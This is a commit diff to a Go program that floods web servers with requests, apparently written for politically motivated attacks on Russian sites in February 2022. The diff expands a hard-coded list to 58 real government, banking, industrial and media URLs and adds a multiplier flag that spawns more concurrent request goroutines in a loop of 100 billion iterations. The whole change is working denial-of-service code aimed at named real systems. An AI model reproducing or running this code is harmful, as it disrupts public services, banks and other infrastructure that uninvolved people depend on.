2d7a64944911cd279a60c45d8c05829b51e39ba0
shvinokaras <100472995+shvinokaras@users.noreply.github.com>
2022-02-26 20:48:24 +0100

    Update main.go

--- main.go
+++ main.go
@@ -1,6 +1,7 @@
 package main
 
 import (
+	"flag"
 	"fmt"
 	"log"
 	"net/http"
@@ -27,14 +28,39 @@ func processUrls(urls []string) {
 
 func main() {
 	log.Println("Fuck russia!")
-	targets := [13]string{
+	targets := [58]string{
+		"https://rkn.gov.ru/", "https://pfr.gov.ru/", "https://customs.gov.ru/",
+		"https://www.nalog.gov.ru/", "https://www.nalog.gov.ru/", "https://mil.ru/",
+		"http://government.ru/", "http://kremlin.ru/", "https://www.mos.ru/uslugi/",
+		"https://www.gosuslugi.ru/", "https://www.gazprombank.ru/", "https://www.vtb.ru/",
+		"https://www.sberbank.ru", "https://omk.ru/", "https://www.eurosib.ru/",
+		"https://www.uralkali.com/ru/", "https://www.polymetalinternational.com/ru/",
+		"https://ya.ru/", "https://www.tmk-group.ru/", "https://rmk-group.ru/ru/",
+		"https://nangs.org/", "https://www.metalloinvest.com/", "https://www.severstal.com/",
+		"https://www.sibur.ru/", "https://nlmk.com/", "https://www.evraz.com/ru/", "https://www.tatneft.ru/",
+		"https://www.surgutneftegas.ru/", "https://www.nornickel.com/", "https://magnit.ru/",
+		"https://lukoil.ru", "https://www.gazprom.ru/ ",
 		"https://lenta.ru/", "https://ria.ru/", "https://lenta.ru/", "https://ria.ru/",
 		"https://ria.ru/lenta/", "https://www.rbc.ru/", "https://www.rt.com/", "http://kremlin.ru/",
 		"http://en.kremlin.ru/", "https://smotrim.ru/", "https://tass.ru/", "https://tvzvezda.ru/",
 		"https://cbr.ru/",
+		"https://ipoteka-tut.ru",
+		"https://vegabank.ru",
+		"https://moskb.ru",
+		"https://handybank.ru",
+		"https://creditural.ru",
+		"https://uralsibbank.ru",
+		"https://vfbank.ru",
+		"https://nz.ru",
+		"https://ns-bank.ru",
+		"https://my-zaim.ru",
+		"https://bank-hlynov.ru",
+		"https://psbank.ru",
+		"https://tpsb.com.ru",
 	}
 	iterations := 100000000000
-
+	multiplier := flag.Int("m", 1, "multiplier counter")
+	flag.Parse()
 	bar := progress.New(0, int64(iterations))
 	_, _ = bar.Start()
 	defer func() {
@@ -46,7 +72,9 @@ func main() {
 	}()
 
 	for i := 0; i < iterations; i++ {
-		go processUrls(targets[:])
+		for j := 0; j < *multiplier; j++ {
+			go processUrls(targets[:])
+		}
 		time.Sleep(100 * time.Millisecond)
 		_, _ = bar.Advance(1)
 	}
